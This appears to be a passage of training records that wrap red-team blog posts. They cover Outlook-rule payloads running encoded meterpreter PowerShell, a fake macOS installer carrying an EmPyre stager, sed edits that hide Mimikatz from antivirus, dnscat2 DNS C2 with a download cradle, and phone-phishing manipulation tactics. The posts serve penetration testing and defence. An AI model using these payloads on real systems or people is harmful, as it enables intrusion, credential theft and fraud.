you call from. What\u2019s more valuable is the quality of the phone connection.  I have had people call me back to confirm I was who I said I was, but that was easily mitigated by answering the phone call as the person I had just claimed to be at the company I said I was calling from.\nLive in your role, and realize that in this role you aren\u2019t lying\nPart of what makes phishing calls difficult is that you\u2019re lying, bold-faced lying, and for normal non sociopathic people, this can be difficult.  But since this is part of work, and you are seriously wanting this company and its employees to understand the dangers of phishing phone calls, you need to actually sell these calls and service you are doing is truly good.  When I\u2019m doing these calls I am both hoping to succeed and also desperately to fail.  I give employees who refuse my requests an air high-five and silently congratulate them on their job well done!\nAppeal to a person\u2019s sense of duty\n-We look back through history and say, \u201chow could normal family men (and otherwise \u201cgood\u201d people) be Nazi prison guards during WWII?\u201d  Because someone in authority told them to do something, and all of us generally want to please the people who are in authority over us.  I wish I could say these sorts of appeals weren\u2019t as easy as they are.\n-With this in mind don\u2019t ask someone to do something, kindly but firmly tell them you are in authority and that you\u2019re not really asking as much as telling. (This can be a tricky line to walk because people also hate being bossed around.)  But don\u2019t let\u2019s them say no, just keep telling.\nBuild credibility by back-feeding information\n-Confirm their email (or any other information you may have like location, birthdate etc.) to establish that you are a person in the know who has authority.\n-This also helps if you need to get more pieces of information, you establish trust by offering a few pieces and then ask for the rest.\nAppeal to a person\u2019s willingness to help\n-People are generally helpful, especially if you can play a floundering card (I\u2019ll get in so much trouble if you don\u2019t help me!)\nMake a role for yourself where you aren\u2019t accountable to direct questions\nIf you\u2019re talking to tech people play ignorant (in my case this is easy!), If you\u2019re talking non tech people, play tech person!\n\u201cI am calling for my husband, and don\u2019t know the details of the account.\u201d\n\u201cI am just doing my job, would you like to talk to my boss?\u201d\nMisdirection is your friend\n-Make the goal something deeper than your true intended goal. I.e. you need them to log in to a portal, but don\u2019t make that the point but something beyond that so that they don\u2019t get distracted by logging into the portal, it is only part of the needed process.\n-If they ask questions, just ask them more questions until they forget their original hesitancy.\nStress the urgency of the matter\n-\u201dThis matter is extremely time sensitive.\u201d\n-You need the information before you get in trouble from your boss/spouse.\nStress how thankful you are for their help\n-Customer service reps are taught to be gracious and helpful.\n-People are more prone to do what you ask if you\u2019re nice.\n*On calls I\u2019ve had people even offer to try the link I\u2019ve emailed on their home computers when they\u2019re not on the clock.  If I were a bad guy, and you logged in at home, I\u2019d also have your home computer information and location, yes! Please, give that to me also!\nPeople\u2019s critical thinking and self-control is at a low in the mid afternoon\n-Ever given into a sweet tooth craving at 3pm? Appeal to that by calling in this time frame where they are less likely to refuse your requests, even if they are suspicious and you\u2019re asking them to do something they\u2019ve been specifically trained not to do. People are more likely to just be in a rush to finish the day at this time.\nLearn when to bail & when not to bail.\n-This can be tricky, because it\u2019s sometimes more suspicious to hang up on someone.\n-If they put you on hold, or go get their manager hang tight. Sometimes you can get a manager to do what you couldn\u2019t get the employee to do.  Build credibility.\n-If you get hesitancy early in your calls hang up and keep going, this person is the most likely to call security and shut your whole operation down.\n-If they put you on hold, hang up and call back saying you got disconnected.\n-If they get hostile, assure them you\u2019re from headquarters/IT/HR/the bosses.\nConclusion\nWhen in doubt remember your job is to try, not to succeed - ultimately this is training not real phishing so it\u2019s okay to give up if they really won\u2019t comply with your request.\nThese same ideas are useful as we spot people in other areas of our own lives who may be trying to manipulate us.  As always stay cautious out there!!\nUp next for this marketer?  Maybe I\u2019ll try my hand at physical testing, though after reading Sally\u2019s account I have to admit I was having some cold sweats thinking about those anxiety inducing thrills!\n_______\n*A big shout out to Kelsey Bellew for helping and giving ideas, she's another social engineering rock star!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Malicious Outlook Rule without an EXE\"\nTaxonomies: \"C2, Red Team, exploit, malicious outlook rules, Outlook, Sacred Cash Cow Tipping\"\nCreation Date: \"Tue, 20 Dec 2016 16:16:15 +0000\"\n Carrie Roberts //\n\nMy current favorite exploit is creating malicious outlook rules as described here. The rule is configured to download an executable file with an EXE extension (.exe) when an email with a certain subject line is received. The executable establishes a command and control (C2) session with the attacker\u2019s server.\nOn a recent assessment I ran into a situation where the customer network I was testing had firewall rules in place that did not allow download of any file with an EXE extension. When the outlook rule triggered, the user would see the following error and no C2 session was established.\n\nI found that downloading PowerShell files with a .ps1 extension was allowed, but when the rule triggered the script was simply opened in a text editor and not executed. I visited this site to review other Windows executable extensions that may be allowed for download as well as automatically execute. I found that downloading HTA, BAT, VB, VBS and VBSCRIPT files were also blocked . . . but VBE files were allowed.\n\nWith one hurdle overcome, I proceeded to generate a Visual Basic script to establish the C2 connection using the msfvenom tool as follows:\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST= LPORT=443 -f vbs\nUnfortunately this was caught by Symantec EndPoint Protection and blocked from running on the target. Instead, I manually created the script using two lines of code similar to the following:\nSet objShell = CreateObject(\"Wscript.shell\")\n\nobjShell.run(\"powershell -window hidden -EncodedCommand JA<..snip..>A=\")\nNote that the encoded command has been shortened (\u201csnipped\u201d) in the code above for brevity.\nThe PowerShell command shown in the second line of code was generated by the Unicorn tool with the command below. (see https://github.com/trustedsec/unicorn)\n./unicorn.py windows/meterpreter/reverse_tcp 443\nOne drawback to the proposed VBE method is that it causes a command window to pop up for a split second when it executes which may alert the victim that something suspicious just happened. Let\u2019s adjust the second line of our script, passing in a second parameter of \u201c0\u201d. This instructs the script to hide the window. Oddly enough, you have to remove the surrounding parenthesis from the method call to add this parameter. The new and improved VB script is shown below.\nSet objShell = CreateObject(\"Wscript.shell\")\n\nobjShell.run \"powershell -window hidden -EncodedCommand JA<..snip..>A=\",0\nAnd that did it, I can now establish a C2 session by sending an email to the target, without requiring an EXE file to pass through the firewall.\n\n______\n\nFor detailed instructions on creating malicious outlook rules, see this post.\n\n______\n\nThis will also be covered in our soon to be scheduled Sacred Cash Cow Tipping webcast!! Stay tuned on Twitter for more details.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Phish for Geniuses\"\nTaxonomies: \"Author, C2, David Fletcher, Red Team, Apple, Install, Mac, Malware, phishing\"\nCreation Date: \"Tue, 03 Jan 2017 15:52:25 +0000\"\nDavid Fletcher //\n\nRecently we were involved in an engagement where we expected to see a large number of Macs in the target environment. As an element of the engagement we decided to investigate options for delivery of malware to these devices.  The following outlines one of the methods we were able to explore and use.\n\nNote: This is not a new technique by any means. It is an adaptation of the method that Carlos Perez describes at:\n\nhttp://www.darkoperator.com/blog/2009/4/25/evil-packaging-on-osx-with-xcode-and-metasploit.html\n\nUnfortunately, it appears that Apple dropped support for Package Maker in recent versions of XCode and it can no longer be installed as an add-on to the XCode environment. After doing some research I stumbled across the following blog post describing development of payload free packages using the OSX pkgbuild utilities.\n\nhttps://derflounder.wordpress.com/2012/08/15/creating-payload-free-packages-with-pkgbuild/\n\nThe valuable element of this post is that we can create a shell script called postinstall without requiring a package payload and generate a \u201cpkg\u201d file which will run a wizard style installer executing our script at the end.\n\nArmed with this knowledge, it immediately occurred to us that EmPyre would be the perfect tool to generate the contents of our postinstall script. Selection and generation of the EmPyre \u201cbash\u201d stager module outputs a bash script that includes a base64 encoded stager which executes and deletes itself as seen below.\n\nThe shell script output by EmPyre is then copied into a file called postinstall and marked as executable. This file is then placed inside our package folder (it can be named anything) within the scripts directory. In the example below, we simply created a folder called Malware_Package which contained the scripts directory. Within that directory you can see our postinstall shell script.\n\nAt this point we could create our package which would launch our payload on the target computer.  However, running an installer, driving through the wizard, and not having the expected software installed may appear suspicious to an end user.  To fix this, we can modify our payload script to include a couple of useful popup messages that might deter targeted users from investigating any further.  The following modified shell script will output such a popup message.\n\nWith the calls to \u201cosascript\u201d at the end of our shell script,  the popup message will appear after our malicious payload has executed.\n\nAfter completing these simple tasks, we are prepared to build our final package for delivery. We can accomplish this using the pkgbuild utility as seen below. The interesting elements of the command invocation are the --nopayload and --scripts folder arguments. The final product is the \u201cpkg\u201d file which can be delivered to the target.\n\nThe wizard installer that we just created executes as seen below:\n\nLaunch the introduction to the wizard...\n\nSelect the location to install the package...\n\nThe application then prompts for permission to install.  The user supplies root level credentials to continue the install process (and execute our agent as root).\n\nOne of our popup messages indicating that the package will communicate with the internet (our agent in reality).\n\nOh, no...an error\u2026\n\nAhh...the installation was successful\u2026\n\nBack at our C2 server we see the following...\n\nThis is just the tip of the iceberg. With a full blown installer environment we can make installer packages that look extremely realistic and mimic the behaviors of their legitimate cousins. Yet another reason to train users with the ability to install software to check signatures and only execute software from truly legitimate sources.\n\nWith the majority of mail filters and proxies focusing on Windows and office automation infection vectors, would a malicious \u201cpkg\u201d file make it into your environment?\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Bypass Anti-Virus to Run Mimikatz\"\nTaxonomies: \"Red Team, Red Team Tools, All the AVs, anti-virus, bypassing AV, Carrie Roberts, mimikatz, Windows Defender\"\nCreation Date: \"Thu, 05 Jan 2017 15:34:23 +0000\"\nCarrie Roberts // *\n\nWould you like to run Mimikatz without Anti-Virus (AV) detecting it? Recently I attempted running the PowerShell script \u201cInvoke-Mimikatz\u201d from PowerSploit on my machine but it was flagged by Windows Defender as malicious when saving the file to disk. Even when I ran this file without writing it to disk using the following command it still got caught.\n\npowershell \"IEX (New-Object Net.WebClient).DownloadString ('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz\" \n\n Windows Defender Detects Unmodified Mimikatz Script \n\nUploading the Invoke-Mimikatz.ps1 file to VirusTotal showed that 19 of 54 AV vendors currently detect this file as malicious.\n\n AV Detection Rate for Unmodified Mimikatz Script \n\nWhile uploading to VirusTotal is not a conclusive way to determine if a malicious file will be detected, it can hint to what AV may be triggering on.\n\nAs you may know, AV detection schemes can be weak, simply looking for specific words in the file. Often these words can be changed without changing the functionality. For example, changing \u201cInvoke-Mimikatz\u201d to \u201cInvoke-Mimidogz\u201d using the following Linux command brings the detection rate down to 8 of 54\n\nsed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1\n\n AV Detection Rate for \u201cKatz\u201d to \u201cDogz\u201d \n\nAnd how about getting rid of those unnecessary comments in the script?\n\nsed -i -e '/<#/,/#>/c\\\\' Invoke-Mimikatz.ps1\n\nsed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1\n\n AV Detection Ratio After Removing Comments from Script \n\nWe are down to four (4) AV vendors detecting the malicious file after renaming \u201cKatz\u201d to \u201cDogz\u201d and removing comments. A little further experimentation shows that AV doesn\u2019t like the word \u201cDumpCreds\u201d, let\u2019s change it to \u201cDumpCred\u201d.\n\nsed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1\n\n AV Detection After Renaming \u201cDumpCreds\u201d \n\nWe could probably quit here and get a lot of mileage out of this script, but as my daughter would say after reading the disclaimer on hand sanitizer, \u201cWhy don\u2019t they just put a little bit more in and kill \u2018em all!?\u201d  \n\nSo let\u2019s do this. Just add three more match and replace rules and \u201cWinner, winner, chicken dinner!\u201d The complete list of match and replace commands is listed below.\n\nsed -i -e 's/Invoke-Mimikatz/Invoke-Mimidogz/g' Invoke-Mimikatz.ps1\nsed -i -e '/<#/,/#>/c\\\\' Invoke-Mimikatz.ps1\n\nsed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1\n\nsed -i -e 's/DumpCreds/DumpCred/g' Invoke-Mimikatz.ps1\n\nsed -i -e 's/ArgumentPtr/NotTodayPal/g' Invoke-Mimikatz.ps1\n\nsed -i -e 's/CallDllMainSC1/ThisIsNotTheStringYouAreLookingFor/g' \nInvoke-Mimikatz.ps1\n\nsed -i -e \"s/\\-Win32Functions \\$Win32Functions$/\\-Win32Functions \n\\$Win32Functions #\\-/g\" Invoke-Mimikatz.ps1\n\n No AV Detection After Match and Replace Rules \n\nWe took this modified Mimikatz file and ran it against systems running up-to-date versions of Windows Defender, Symantec, and ESET. (Thanks to Brian Fehrman and David Fletcher). We were able to run the script to dump cleartext passwords from memory and it was not detected by AV.\n\n Modified Mimikatz Script Still Functional \n\nWe successfully modified the Mimikatz script to avoid AV detection without changing the functionality. Great evidence to why you should not rely solely on your AV for protection.\n\n*This post is part of the bigger \u201cSacred Cash Cow Tipping\u201d series about bypassing AV, particularly our most recent episode found here.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"My Ransomware Post-Mortem\"\nTaxonomies: \"Blue Team, backups, be prepared, breach, Christmas delivery phish, good times all around, Oh !@$# moments, Osiris ransomware, ransomware\"\nCreation Date: \"Mon, 09 Jan 2017 17:06:48 +0000\"\nCody Smith* //\n\nAs information security professionals we\u2019re not invincible to breaches. Even the most robust security system can\u2019t make up for a lack of user education, which I was painfully reminded of in December of 2016.\nMy \u201c\u2026 !@$#\u201d Moment:\nLate one Sunday night, I was sitting at my desk working toward an empty inbox when a client of mine called me.\n \u201cHey, do you have a minute? I can\u2019t seem to open my files.\u201d\n\u201cSure, what\u2019s going on?\u201d\n\u201cWell, I can see where my files should be, but I can\u2019t open anything. None of them look like they\u2019re supposed to.\u201d\n\u201cCan you describe what you\u2019re seeing?\u201d\n\u201cAll of the file icons look like white pieces of paper, and their names are just a bunch of garbled letters with a weird file extension.\u201d\nAt this point, I was quite concerned, \u201cWhat does it say?\u201d\n\u201cDot Osiris? I don\u2019t know if I\u2019m saying that right.\u201d\n\u201c\u2026 !@#$.\u201d\nMy Response:\nI quickly threw together my typical \u201cgo-bag\u201d for things like this. My Apple MacBook Pro, a MacBook Air that has been converted into a Kali Linux machine, and a couple of flash drives with various distros, tools, etc.\nOn my way to the site, I prepared myself to see the worst. Maybe this is because of my training as a fireman, or maybe it was just my paranoia. Nonetheless, here is what I was expecting:\n\nFull propagation throughout the SOHO network.\nFull data-loss on multiple computers.\nLoss of a client\n\nHowever, when I got to the business, I realized that we weren\u2019t as bad off as I had thought. While the one user\u2019s files were encrypted (more on that later), the ransomware had only managed to encrypt that computer, and no other device on the network was affected. So, what happened, and how did it happen? Let\u2019s break this down into what went wrong and what went right.\nWhat Went Wrong:\nIn short, one thing went wrong. I didn\u2019t educate the end-user on a recent threat that\u2019s been sweeping the internet. I didn\u2019t educate them on how \u201chackers\u201d (or skids) were using scam-emails to deliver ransomware through Microsoft Office documents. That is my fault and mine alone. I took responsibility for the breach even though I wasn\u2019t the one that caused it. Why? Because the network\u2019s security was my responsibility, and as such, so was anything that happened to it.\nThe user was sent an email similar to ones I\u2019ve seen in the past. It was an email from \u201cFedEx\u201d claiming that a package couldn\u2019t be delivered to the user. The plot twist? My user was expecting a package that day, from FedEx, and it wasn\u2019t delivered to him.  I know, what\u2019s the chance of this happening right? Well, the user downloaded the file, and they joyfully put in their password to the U.A.C. prompt when it came up. They enabled the Excel document\u2019s macros, and then the ransomware propagated throughout the computer. However, unlike other attacks I\u2019ve read about, it didn\u2019t propagate throughout the network.\nWhat Went Right:\nI\u2019m overly paranoid when it comes to security, so I had various steps in place to mitigate this threat. (Clearly, I didn\u2019t have enough.) Below, I\u2019ve listed an overview of what went correctly.\n\nBackups \u2013 If you\u2019ve never been on the receiving end of ransomware, you probably don\u2019t know how grateful you are for backups. (Unless you own a Seagate hard-drive) My client had an effective backup strategy. Weekly backups from the computers to the local NAS, and from that NAS a weekly upload to an Amazon Web Services S3 Bucket. After that backup has sat in the S3 bucket for one week, it\u2019s transferred over to AWS\u2019s Glacier just in case the newest S3 backup has issues. Having the most recent backup in S3 allowed for a quick download (considering it was a 64GB file) that I was able to restore files from the next day.\n\nNetwork Drive Segmentation \u2013 A lot of SOHOs have file-shares, and that\u2019s okay. However, if one file-share has access to every computer on the network, then you\u2019re going to have a bad time. However, this client\u2019s network was segmented in such a way that users only had access to their own drive, for \u201ccross account\u201d sharing, a special drive is used with a different username and password than their personal folders.\n\nOsiris Sucks \u2013 If you\u2019re the author of Osiris, we have to have a talk, and for a few reasons.\n\nYour malware didn\u2019t encrypt anything with the .jpeg extension.\n\nYour malware didn\u2019t encrypt anything with the .pdf extension.\n\nYour malware didn\u2019t manage to change the background on the computer, and it only left 2-3 ransom notes, but none on the desktop\nYour malware didn\u2019t leave any .html files, but instead .htm files. *sighs*\n\nNow, don\u2019t get me wrong. Osiris Ransomware isn\u2019t something you want to meet in the wild, and you really don\u2019t want to meet it like I did, when the only post you found about it was two days old. However, Osiris isn\u2019t without its faults.\nWhat I Could\u2019ve Done Better:\nI could\u2019ve had local account policy in place to thwart the ability to run Macros in Office Documents, as well as the ability to run anything out of %Temp%. I could\u2019ve better educated my end users. I could have just sent out an email warning my clients of the possibility of them receiving one of the emails like what had caused our breach. Lastly, I could\u2019ve tested to see if my faith in my end users was warranted. I could\u2019ve sent them all an email that looked like \u201cthe email\u201d and took note of who actually opened the document and ran the Macros. This would have at least allowed me to better see who is aware of what threats.\nWhat you can do:\nWith that said, I\u2019d like to leave you with a few easy tips of what you can do to improve your security posture:\n\nBackups saved my life, and they can save your life too. It isn\u2019t good enough to just \u201chave backups\u201d Your backups have to work, and they have to be current. If you haven\u2019t checked your backup method in a while, do so! It can save your rear some day. \nFile shares are sometimes a necessary evil, but you can greatly reduce the risk if you try to do so. Just because someone thinks they need access to a drive doesn\u2019t mean they do. A simple principle of least access comes in here. \n\n User education is still the weakest point of any I.T. infrastructure, and it\u2019s also one of the most important domains to make sure you have covered. We often overlook user education because \u201cusers are all idiots that shouldn\u2019t be allowed near a computer\u201d. However, while that may be the case, it isn\u2019t good practice. Educate your users and they\u2019ll be able to help you far more than you could hope for. \n\nSo with that said, I leave you with this: Can your network handle this breach? \n_____\n*Cody Smith is a guest poster**.  He is a Performance Engineer, Cyber-Security Junkie, and frequently tweets GIFs. He spends most of his time attempting to keep up with current trends, malware samples, threats, and vulnerabilities. In his spare time, likes to browse the web for pictures of Corgis.\n**Oh, you want to guest post for us too? Shoot us a Twitter DM, or email us via our contact form!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"PowerShell DNS Command & Control with dnscat2-powershell\"\nTaxonomies: \"C2, Red Team, C2, DNS C2, dnscat2, PowerShell, tunneling\"\nCreation Date: \"Wed, 11 Jan 2017 18:04:32 +0000\"\nLuke Baggett //\n\nImagine a scenario where a Penetration Tester is trying to set up command and control on an internal network blocking all outbound traffic, except traffic towards a few specific servers the tester has no access to. In this situation, there is still a last-ditch option the tester can use, that being DNS command and control.\n\nIf you\u2019re unfamiliar with DNS command and control, the basic idea involves a C2 client sending data inside DNS queries. These DNS queries are forwarded across the internet\u2019s DNS hierarchy to an authoritative DNS server, where the C2 server is located. The C2 server then returns data inside the DNS response, which is forwarded back to the C2 client. DNS must be implemented to allow an internal network to communicate with the Internet in any meaningful way, therefore C2 over DNS is highly effective.\n\nDnscat2 by Ron Bowes is one of the best DNS tunnel tools around for infosec-related applications. DNScat2 supports encryption, authentication via pre-shared secrets, multiple simultaneous sessions, tunnels similar to those in ssh, command shells, and the most popular DNS query types (TXT, MX, CNAME, A, AAAA). The client is written in C, and the server is written in ruby.\n\nI recently finished implementing all the features of the dnscat2 C client in a PowerShell client available here, and included a few extra PowerShell specific features. PowerShell is quite common among real-world attackers and penetration testers alike due to its numerous features, versatility, and the fact it is built in to most Windows systems. In this blog post, we\u2019ll look at how the dnscat2-powershell script can be used.\n\nAlthough dnscat2 is designed to travel over DNS servers on the Internet, it can also send DNS requests directly to a dnscat2 server, which is useful for testing. This blog post will only show examples using local connections, but you can read about how to set up an authoritative server here.\n\nSetup\n\nRon Bowes gives a great tutorial on how to install the server in his README for dnscat2. Once the server is ready, you can start it like this:\n\nsudo ruby dnscat2.rb --dns \u201cdomain=test,host=192.168.56.1\u201d --no-cache\n\nUsing the \u201c\u2014no-cache\u201d option is required for the PowerShell client to work correctly due to the fact that the nslookup command uses sequential DNS transaction ID values that are not initially randomized.\n\nA Windows machine with PowerShell version 2.0 or later installed is required to use dnscat2-Powershell. The dnscat2 functions can be loaded by downloading the script and running the following command:\n\nImport-Module .\\dnscat2.ps1, \n\nAlternatively you can paste the following command into PowerShell to enable the dnscat2-powershell functionality:\n\nIEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/\nlukebaggett/dnscat2-powershell/master/dnscat2.ps1')\n\nOnce the functions are loaded, run the following command to start the dnscat2-powershell server:\n\nStart-Dnscat2 -Domain test -DNSServer 192.168.56.1\n\nStart-Dnscat2 is the name of the main function used in dnscat2-powershell that allows clients to establish a command session with the server. From the server, you can now direct the client to perform different actions. Here\u2019s a video that shows what this looks like:\n\n[embed]https://youtu.be/IFmQsgxkcvs[/embed]\n\nIf you don\u2019t want to use a command session, you can use the -Exec, -ExecPS, or -Console parameters for Start-Dnscat2.\n\nPowerShell Features\n\nExtra PowerShell-related features have been added to dnscat2-powershell command session. For example, you can simulate an interactive PowerShell session by typing the following command:\n\nexec psh\n\nYou may also pass the -ExecPS switch to Start-Dnscat2 to enable this feature. The client will take input from the server, pass it to Invoke-Expression, and return the output. Variables are preserved throughout the client\u2019s lifespan. This allows the usage of awesome PowerShell tools such as PowerSploit.\n\nScripts can be loaded into memory on the client over DNS by typing the following command:\n\nupload /tmp/script.ps1 hex:$var\n\nThe hex representation of the file will be placed into the $var variable. From there, the hex can be converted to a string and loaded as a PowerShell function. Similarly, typing the following command:\n\nupload bytes:$var /tmp/var  \n\nwill download a byte array stored in $var, and write it to /tmp/var. At the moment, these two features are new and buggy, and are more reliable with smaller scripts.\n\nIn the video below, a simulated PowerShell session is shown, as well as how you can load other PowerShell scripts via DNS. The example script is Get-Keystrokes, part of Powersploit.\n\n[embed]https://youtu.be/Th83OmLiQN8[/embed]\n\nEncryption\n\nBy default, all traffic is encrypted. This can be turned off by passing -NoEncryption to Start-Dnscat2, and starting the server with following command option:\n\n-e open\n\nWithout encryption, all dnscat2 packets are simply hex encoded, making it fairly simple for people who know the dnscat2 protocol to reassemble the data.\n\nAuthentication with a pre-shared secret can be used to prevent man in the middle by passing a password to -PreSharedSecret on the client, and the \u2013c option on the server.\n\nTunnels\n\nDnscat2 supports tunnels similar to SSH Local Port forwarding. The dnscat2 server listens on a local port and any connection to that port are forwarded through the DNS tunnel, and the dnscat2 client forwards the connection to a port on another host.\n\nOne scenario where this comes in handy is when the dnscat2 client is on an internal network with an SSH server. By setting up a tunnel from a port on the server to the SSH server on the internal network, you can achieve an interactive SSH session over DNS. The below video shows how this is done:\n\n[embed]https://youtu.be/gh03CpaUxbQ[/embed]\n\nAvoiding Detection by generic signatures\n\nThere are many ways to detect DNS tunnels. Checking the query length of outbound DNS queries, monitoring the frequency of DNS queries from specific hosts, and checking for specific uncommon query types are a few examples.\n\nA static or random delay can be added between each request the client sends by using -Delay and -MaxRandomDelay with Start-Dnscat2. The delay can be changed from a command session by typing the following command:\n\ndelay \n\nThis can help avoid detection by systems using frequency based analysis. It\u2019s useful for a DNS tunnel to use the maximum length of a DNS query to transfer data faster. Yet, how often is a legitimate user going to be sending maximum length DNS queries? A signature could be written based on queries using the precise maximum length of a query. If you want to be slightly more stealthy, you can shorten your maximum request size with the -MaxPacketSize parameter.\n\nMany DNS tunnels will use TXT, CNAME, or MX queries due to the simplicity of processing their responses, and their long response length. These aren\u2019t the most common query types, so an IDS may alert on the high frequency of these queries. A and AAAA queries are much more expected, so using them may help you slip past IDS detection. The -LookupTypes parameter for Start-Dnscat2 can be used to pass a list of valid query types to the client. The client will randomly select a query type from this list for each DNS query it sends.\n\nUsing all three of these options makes writing a good signature for dnscat2 slightly more complicated. A video below shows all of these options combined, and how modifying the options noticeably impacts data transfer speed.\n\n[embed]https://youtu.be/VrA8cyrssos[/embed]\n\nConclusion\n\nTunneling your communications through DNS has some real practical advantages. Primarily, providing a shell in environments with even the most extreme outbound traffic filtering. The major downside is the slow speeds involved with forwarding all your traffic through the internet\u2019s DNS servers. Now with a PowerShell version of the dnscat2 client, penetration testers can easily use DNS-based C2 alongside familiar PowerShell tools.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Android Dev & Penetration Testing Setup - Part 1\"\nTaxonomies: \"Author, Joff Thyer, Mobile, Red Team, Android, Android Dev, mobile apps, Pentesting, pentesting mobile apps\"\nCreation Date: \"Tue, 17 Jan 2017 18:07:08 +0000\"\nJoff Thyer //\n\nEditor\u2019s Note:  This is part 1 of a 3 part series.  Part 1 will discuss configuring your virtual machine engine and virtual hardware emulation.  Part 2 covers installing Android for the emulator, and Part 3 covers installing the drozer attack framework.\n\n_______\n\nIf you\u2019re planning to test mobile apps on Android, then you\u2019ll need a suitable environment setup with the correct development tools, Android emulation, and the drozer security and attack framework. This blog post will walk through the steps to correctly configure an Ubuntu 16.04 system to engage in both penetration testing and development with Android apps.\n\nA word of warning on this documented procedure: several hundred megabytes of data will need to be downloaded from the internet; thus, if you are trying to do this at a hotel or public Wi-Fi spot, I suspect you will be quite disappointed. Make sure you are connected to at least 10 Mbps downstream.\n\nYou have a choice of using a physical or virtual machine. This post will focus on creating a virtual machine with VMware Fusion on OSX. Be aware that there are significant resource requirements for this project that are dependent on how much RAM you want to devote to the emulator.\n\nAbsolute Minimum VM Resources Required:\n\nSoftware\n\nUbuntu 16.04.1 Desktop\n\nHardware\n\n2 GB RAM\n\n2 processor cores\n\n50 GB hard disk\n\nDue to the size of the Android studio and emulator installation downloads, you will end up with an Ubuntu system using about 30 GB of disk space from day one. When the emulator is running, it allocates 1 GB of RAM for the memory of the device by default. If possible, the preferred machine resource configuration should be increased to 4GB RAM, and 4CPU cores.\n\nStart by performing a standard Ubuntu 16.04.1 desktop installation on the virtual machine. Since you will be running in a GUI environment, the desktop distribution is required. Note: This installation and test were performed on VMware Fusion version 8.5.3. I have included a screenshot below so you can see the exact release information.\n\nConfigure Virtual Machine Engine and Virtual Hardware Emulation\n\nAfter the installation is complete, shut down the Virtual Machine and modify its configuration as follows.\n\nChange the preferred virtualization engine to  \u201cIntel VT-x with EPT\u201d\n\nPerform an edit using your favorite text editor (that must be \u201cvi\u201d of course!), and add a line into the VMware VMX file to enable hardware-assisted virtualization. vhv.enable = \u201cTRUE\u201dThis is required in order for the emulator to have any fighting chance of performing decently.\n\nNow boot up your Ubuntu 16.04.1 VM again and log in as a regular user. It is assumed that you will have created an ordinary user account as part of the installation.\n\nAs soon as you log in to the Ubuntu desktop, you need to install the \u201ccpu-checker\u201d package so that we can verify that \u201cKernel Virtual Machine\u201d (KVM) acceleration support is properly recognized by the VM. When the package finishes installing,  run the command \u201ckvm-ok\u201d as root to perform the check.\n\n Installing the \u201ccpu-checker\u201d Package \n\n Performing the KVM check \n\nInstall Oracle Java8\n\nAt this point in time, we need to install an appropriate version of Java. The best option that seemed to work for me was to select the latest Oracle Java package. In order to do this, you need to add a new repository and then install the Java package.\n\nThe actual terminal commands you need are as follows:\n\n$ sudo apt-add-repository ppa:webupd8team/java\n$ sudo apt update\n$ sudo apt install oracle-java8-installer\n\nDuring the Oracle Java8 installation, you will also need to accept the Oracle binary license.\n\nAfter installing Oracle Java 8, you are ready to begin the Android studio development software, and Android emulator installation.\n\nEditor\u2019s Note: Remember, this is Part 1 of 3. Part 2: Installing Android for the Emulator is here. Check out Part 3 here.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Android Dev & Penetration Testing Setup  Part 2: Installing Android Studio\"\nTaxonomies: \"Author, Joff Thyer, Mobile, Red Team, Android, Android Dev, mobile apps, Pentesting\"\nCreation Date: \"Fri, 20 Jan 2017 15:05:57 +0000\"\nJoff Thyer //\n\nEditor\u2019s Note:  This is part 2 of a 3 part series.  Part 1 discussed configuring your virtual machine engine and virtual hardware emulation.  Part 2 (this part) covers installing Android for the emulator, and Part 3 covers installing the drozer attack framework. \n\nAfter the Java installation has finished, you will need to visit the Android Studio download page and install the latest Linux version of Android Studio.\n\nVisit https://developer.android.com/, and download the Linux package. If you use Firefox on the Ubuntu machine itself, the download page will look like this:\n\nWhen the download finishes, make sure you are in your regular, unprivileged user home directory, and unzip the package.\n\n$ cd $HOME\n$ unzip ./Downloads/android-studio-ide-xxx.yyy.zip\n\n Version that was tested for this article \n\nAt this point, we need to run the Android Studio installation exclusively for the reason of obtaining the right software packages to run Android emulation. In other words, after the installation completes successfully, we will just quit Android Studio.\n\nTo start the installation, we run the android-studio shell startup script as follows:\n\n$ cd $HOME\n$ ./adnroid-studio/bin/studio.sh\n\nDuring the installation, much of the software development kit will be downloaded, which will be several hundred megabytes of data. You should accept all of the default options as this installation takes place. Below are the screenshots for your reference.\n\n Installation Wizard \n\n This also confirms that your KVM is working. \n\n Downloading all of the SDK takes a while\u2026. \n\n The final screen \n\nYou can now close Android Studio.\n\nUnfortunately on a 64-bit Ubuntu system, there is a small dependency issue which will prevent the Android Virtual Device emulation system from running properly. This is because the appropriate C++ libraries for 32-bit are not installed by default on Ubuntu. This is easily remedied with the following recipe of installing the right package and then creating a symbolic link to the needed shared library.\n\n$ sudo apt-get install lib64stdc++6:i386\n$ cd ~/Android/Sdk/tools/lib64/libstdc++\n$ mv libstdc++.so.6 libstdc++.so.6-OLD\n$ ln -s /usr/lib64/libstdc++.so.6\n\nBefore proceeding any further, you also will need to add the Android Studio tool directories to your PATH statement for the regular user, making things MUCH easier to use. There are two directories you need to add to the PATH, which can be achieved by editing the \u201c.profile\u201d file, then logging out and back in again after changing the PATH. Below is a screenshot of the changes made on my system. The two directories that must be in your PATH are:\n\n $HOME/Android/Sdk/tools \n\n $HOME/Android/Sdk/platform-tools \n\n Screenshot of \u201c.profile\u201d file editing \n\nInstalling Android Version 6.0 for the Emulator\n\nNow that you have logged out and back into your Ubuntu system, you will need to start up the package management component of Android Studio so that you can download a version of Android, and a binary to use for emulation.\n\n$ android\n\nYou should see an opportunity at this stage to install various Android APIs. Be careful what you choose, these can eat up a lot of hard disk space, especially if you choose to emulate the TV and 